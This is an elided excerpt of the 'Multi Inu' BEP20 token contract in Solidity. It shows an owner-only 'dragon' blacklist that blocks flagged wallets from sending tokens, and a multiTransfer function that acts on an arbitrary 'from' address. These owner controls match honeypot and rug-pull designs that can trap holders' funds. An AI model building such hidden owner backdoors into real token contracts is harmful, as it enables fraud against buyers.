...
contract MultiInu is BEP20, Auth {
    ...
    string public constant name = "Multi Inu";
    ...
    bool public dragonMode = true;
    mapping (address => bool) public isdragoned;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x567CaD40fC7093A5DE7dEF76388a4D834be2A05F;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // dragon
        if(dragonMode && !antibot){
            require(!isdragoned[sender],"dragoned");
        }
    ...
    function kill_dragon_status(bool _status) external onlyOwner {
        if(_status){
            require(launchMode,"Cannot turn on dragonMode after launch is done");
        }
        dragonMode = _status;
        emit config_dragonMode(dragonMode);
    }



    function kill_dragon(address[] calldata addresses, bool status) external onlyOwner {
        require(addresses.length < 201,"GAS Error: max limit is 200 addresses");
        if(status){
            require(launchMode,"Cannot manually dragon after launch");
        }

        for (uint256 i=0; i < addresses.length; ++i) {
            dragon_wallet(addresses[i],status);
        }
    }

    function dragon_wallet(address _adr, bool _status) private {
        if(_status && _adr == pair){
            return;
        }
        isdragoned[_adr] = _status;
        emit Wallet_dragon(_adr, _status);
    }
...
function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    if(msg.sender != from && !isdragoned[from]){
...
event Wallet_dragon(address Wallet, bool Status);
...
event config_dragonMode(bool Status);
